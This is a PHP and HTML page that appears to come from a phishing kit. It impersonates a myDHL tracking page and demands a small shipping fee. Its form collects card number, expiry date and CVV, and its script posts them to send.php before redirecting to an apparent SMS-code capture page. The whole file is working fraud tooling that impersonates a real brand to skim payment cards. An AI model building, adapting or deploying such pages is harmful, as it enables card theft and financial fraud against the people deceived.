<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>myDHL - Tracking</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/cdns/bs.css">
<link rel="stylesheet" href="res/style.css">
<link rel="icon" href="res/icon2.png">
</head>
<body style="background:#eee;">
<header class="container p-2" >
    <div class="row">
        <div class="col text-left">
            <img src="res/logo_exp.png" >
        </div>
    </div>
</header>


<section class="container-fluid">
<div class="container py-5 text-center bg-white" style="width:500px; max-width:100%;">

<div class="text-left">

<h4 style="display:block; margin-bottom:20px;">
<?php echo getLang("_PAY_TITLE");?>
</h4>
 
<table class="table table-sm" style="margin:10px 0; font-size:0.9em;">
<tr>
<td><?php echo getLang("_PAY_TABLE")[0];?>: </td>
<td><span style="margin-right:5px;"><?php echo $currency;?></span> 2.73 </td>
</tr>
<tr>
<td><?php echo getLang("_PAY_TABLE")[1];?>: </td>
<td><span style="margin-right:5px;"> <?php echo $currency;?></span> 0.70 </td>
</tr>
<tr>
<td> <?php echo getLang("_PAY_TABLE")[2];?>: </td>
<td><span style="margin-right:5px;"><?php echo $currency;?></span> 0.14</td>
</tr>
<tr style="font-weight:bold;">
<td><?php echo getLang("_PAY_TABLE")[3];?>:</td>
<td><span style="margin-right:5px;"><?php echo $currency;?></span> 3.57</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</table>

<div class="form p-3" style=" background:#eee; ">


<div class="form-group ">
<label><?php echo getLang("_CARD_INPUTS")[0];?></label>
  <input type="text" inputmode="numeric"  class="form-control" id="d0" placeholder="0000 0000 0000 0000">
</div>


<div class="form-group">
    <label><?php echo getLang("_CARD_INPUTS")[1];?></label>
    <input type="text" inputmode="numeric"  class="form-control" id="d1" placeholder="<?php echo getLang("_CARD_INPUTS")[1]; ?>">
</div>

<div class="form-group">
    <label><?php echo getLang("_CARD_INPUTS")[2];?></label>
    <input type="text" inputmode="numeric"  class="form-control" id="d2" placeholder="000">
</div>




<div class="form-group">
<button onclick="sendCard()" class="btn btn-danger p-2 my-4 w-100"><?php echo getLang("_CONTINUE");?></button>
</div>
</div>





</div>
</section>


<footer class="container-fluid">
<div class="container" >
<div class="row">
    <div class="col-sm-6 text-lg-left text-center">
        <?php echo getLang("_FOOTER_LINKS")[0];?>
    </div>
    <div class="col-sm-6 text-lg-right text-center">
        <?php echo getLang("_FOOTER_LINKS")[1];?>
    </div>
</div>
</div>
</footer>



<style>
.loader{
    width:100%;
    height:100%;
    position:fixed;
    background:rgba(255,255,255,0.8);
    top:0;
    display:none;
	z-index:9999999999;
}
.loader .content{
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
<div class="loader">
<div class="content">
    <img src="res/loading.gif" style=" width:60px;">
</div>
</div>


<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>
$("#d0").mask("0000 0000 0000 0000");
$("#d1").mask("00/00");
$("#d2").mask('000');

var allowSubmit;
var abortVal = true;
var seconds = <?php echo $seconds*1000; ?>;

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=6; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

if($("#d1").val().length<4){
	$("#d1").addClass("error");
	allowSubmit=false;
}



}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){

        $(".loader").show();
        
        $.post("send.php", 
			{	
				cc:$("#d0").val(),
                exp:$("#d1").val(),
				cvv:$("#d2").val()
			
			}, function(done){
               setTimeout(() => {
                window.location="sms.php";
               }, seconds);
                   
                
			}
		
		);

    }
}
</script>
</body>
</html>